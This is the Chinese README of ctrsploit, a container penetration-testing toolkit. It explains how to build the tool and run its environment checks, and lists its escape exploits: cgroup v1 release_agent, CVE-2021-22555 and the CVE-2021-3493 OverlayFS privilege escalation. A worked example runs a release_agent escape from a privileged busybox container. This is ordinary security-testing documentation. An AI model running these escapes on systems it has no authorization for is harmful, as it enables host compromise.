# ctrsploit: 一个容器场景自动化渗透测试工具

[English Version](./README.md)

ctrsploit 读作container sploit

## 为什么我们需要ctrsploit
[这里](https://github.com/ctrsploit/ctrsploit/discussions/11)有详细解释

## Pre-Built Release

https://github.com/ctrsploit/ctrsploit/releases

## 手动编译
### 容器编译
```bash
make binary && ls -lah bin/release
```

### 本地编译

```
make build-ctrsploit
```

## Usage

### Quick-Start

```
wget -O ctrsploit https://github.com/ctrsploit/ctrsploit/releases/download/v0.4/ctrsploit_linux_amd64 && chmod +x ctrsploit
./ctrsploit --help
NAME:
   ctrsploit - A penetration toolkit for container environment

ctrsploit is a command line ... //TODO


USAGE:
   ctrsploit [global options] command [command options] [arguments...]

COMMANDS:
   auto, a     auto gathering information, and detect vuls, and exploit // TODO
   exploit, e  run a exploit
   env, e      gather information // TODO
   help, h     Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --lang value  language for the greeting (default: "english")
   --help, -h    show help (default: false)
```

### 信息收集

usage

```
root@ctr:/# ./ctrsploit env
NAME:
   ctrsploit env - gather information

USAGE:
   ctrsploit env command [command options] [arguments...]

COMMANDS:
   where, w        detect whether you are in the container, and which type of the container
   graphdriver, g  detect graphdriver type and extend information
   cgroups, c      gather cgroup information
   help, h         Shows a list of commands or help for one command

OPTIONS:
   --help, -h  show help (default: false)
```

查看当前是否在容器内，在何容器内：

```
root@ctr:/# ./ctrsploit  env  w
INFO[0000] ===========Docker=========
.dockerenv exists: ✔
rootfs contains 'docker': ✔
cgroup contains 'docker': ✘
the mount source of /etc/hosts contains 'docker': ✔
hostname match regex ^[0-9a-f]{12}$: ✔
=> is in docker: ✔
INFO[0000] ===========k8s=========
/var/run/secrets/kubernetes.io exists: ✘
hostname match k8s pattern: ✘
the mount source of /etc/hosts contains 'pods': ✘
cgroup contains 'kubepods': ✘
=> is in k8s: ✘ 
```

### 漏洞利用

```
root@2aa13a052102:/# ./ctrsploit e
NAME:
   ctrsploit exploit - run a exploit

USAGE:
   ctrsploit exploit command [command options] [arguments...]

COMMANDS:
   cgroupv1-release_agent, ra                       escape tech by using the notify_on_release of cgroup v1
   cgroupv1-release_agent-unknown_rootfs, ra3       escape tech by using the notify_on_release of cgroup v1 without known rootfs
   help, h                                          Shows a list of commands or help for one command

OPTIONS:
   --help, -h  show help (default: false)

```

例如: 使用'cgroupv1-release_agent'技术逃逸:

```
root@host # docker run -ti --rm --security-opt="apparmor=unconfined" --cap-add="sys_admin" busybox
root@ctr # wget -O ctrsploit https://github.com/ctrsploit/ctrsploit/releases/download/v0.4/ctrsploit_linux_amd64 && chmod +x ctrsploit
root@ctr # ./ctrsploit e ra -c "cat /etc/hostname"
```

### 安全检查
在容器内执行`ctrsploit checksec`或执行单独的二进制文件`checksec`

```
[root@ctr ~]# /checksec_linux_amd64 
===========Seccomp=========
kernel supported: ✔
seccomp enabled in current container: ✘

===========Apparmor=========
Kernel Supported: ✘
Container Enabled: ✘

===========Cgroups=========
is cgroupv1: ✔
is cgroupv2: ✘

------sub systems-------
["perf_event" "memory" "net_cls" "cpuset" "blkio" "hugetlb" "files" "cpu" "cpuacct" "pids" "rdma" "freezer" "devices" "net_prio"]

--------top level subsystem----------
["rdma"
```

## 详细信息

### env

| 子命令 | 简写 | 描述 |
| --- | --- | --- |
| [where](./env/where) | w | 检测你是否在容器内，在何种类型的容器内 |
| [graphdriver](./env/graphdriver) | g | 检测graphdriver类型和扩展信息 |
| [cgroups](./env/cgroups) | c | 收集cgroup信息 |
| [capability](./env/capability) | cap | 显示pid为1的进程和当前进程的capability |
| [seccomp](./env/seccomp) | s | 显示seccomp信息 |
| [apparmor](./env/apparmor) | a | 显示apparmor信息 |

### exploit

| exploit | 缩写 | 简述 |
| --- | --- | --- |
| [cgroupv1-release_agent](./exploit/cgroupv1-release_agent) | ra | 利用cgroup v1的notify_on_release功能的逃逸技术 |
| [cgroupv1-release_agent-unknown_rootfs](./exploit/cgroupv1-release_agent-unknown_rootfs) | ra3 | 在不知道rootfs在宿主机路径时，利用cgroup v1的notify_on_release功能的逃逸技术 |
| [cve-2021-22555_ubuntu18.04](./exploit/CVE-2021-22555_ubuntu18.04) | 22555 | 利用CVE-2021-22555的逃逸技术 (ubuntu18.04) |

### helper
| helper | 缩写 | description |
| --- | --- | --- |
| [cve-2021-3493](./helper/cve-2021-3493) | ubuntu-overlayfs-pe,3493 | Ubuntu OverlayFS 本地提权 |

### checksec
在容器内执行`ctrsploit checksec`或执行单独的二进制文件`checksec`